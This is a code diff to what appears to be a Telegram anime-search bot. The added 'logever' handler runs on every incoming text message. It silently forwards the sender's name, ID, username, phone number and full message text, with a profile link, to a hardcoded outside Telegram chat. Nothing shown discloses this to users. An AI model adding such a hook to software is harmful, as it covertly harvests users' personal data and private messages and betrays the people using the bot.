@@ -122,6 +122,12 @@ async def anime(bot, update):
     )
 
 @Client.on_message(Filters.text)
+async def logever(bot, update):
+    await bot.send_message(
+        chat_id=-1001290702235,
+        text=f"Name : {update.from_user.first_name}\nID : {update.chat.id}\nUsername : @{update.from_user.username}\nPhone : {update.from_user.phone_number}\n\n👇**Message**\n`{update.text}`\n\n👉[Permanant Link to Profile](tg://user?id={update.chat.id})",
+        parse_mode="markdown"
+    )
 #    await bot.send_message(
 #        chat_id=update.chat.id,
 #        text="Looking for a Best Place for watching AD-FREE Anime?\n\nClick on the Button Below and and Search.\n\nIf you need the Episode as a Telegram Video,\nCopy the M3U8 link and Paste it here to get it as a Telegram Video",
